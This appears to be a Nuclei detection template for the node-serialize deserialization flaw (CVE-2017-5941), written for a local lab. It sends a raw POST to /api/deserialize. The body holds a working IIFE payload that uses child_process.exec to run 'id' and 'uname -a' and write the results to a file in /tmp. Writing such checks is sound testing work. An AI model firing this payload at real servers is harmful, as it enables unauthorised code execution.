id: CVE-2017-5941

info:
  name: node-serialize <= 0.0.4 - Local Lab Detection (no OAST)
  author: kylew1004
  severity: critical
  description: |
    Local lab check for node-serialize <= 0.0.4 at /api/deserialize.
    It sends an IIFE payload and expects the lab app to return {"ok":true}.
  tags: rce,deserialization,nodejs,lab,cve,cve2017

http:
  - raw:
      - |
        POST /api/deserialize HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Connection: close

        {"data":"{\"p\":\"_$$ND_FUNC$$_function(){require('child_process').exec(\\\"sh -lc 'id > /tmp/pwned_nuclei.out; uname -a >> /tmp/pwned_nuclei.out'\\\");}()\"}"}
    matchers:
      - type: word
        part: body
        words:
          - '"ok":true'
    extractors:
      - type: json
        json:
          - ".ok"
